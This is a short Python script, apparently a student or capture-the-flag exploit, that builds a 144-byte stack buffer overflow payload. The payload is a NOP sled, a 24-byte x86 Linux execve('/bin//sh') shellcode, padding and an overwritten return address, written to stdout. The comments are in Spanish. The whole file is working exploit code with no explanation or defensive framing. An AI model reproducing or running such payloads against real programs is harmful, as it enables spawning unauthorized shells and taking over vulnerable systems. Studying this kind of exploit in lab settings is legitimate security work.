# exploit_final_v4.py
import sys

shellcode = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x89\xe1\xb0\x0b\xcd\x80")
NOP_sled_inicial = 50
shellcode_len = len(shellcode) # 24 bytes
padding_nop = 140 - NOP_sled_inicial - shellcode_len # 66 bytes
EIP_target = b"\xd0\xd3\xff\xff" 

# El payload completo es 50 NOPs + 24 Shellcode + 66 NOPs + 4 EIP = 144 bytes
sys.stdout.buffer.write(b"\x90" * NOP_sled_inicial + shellcode + b"\x90" * padding_nop + EIP_target)
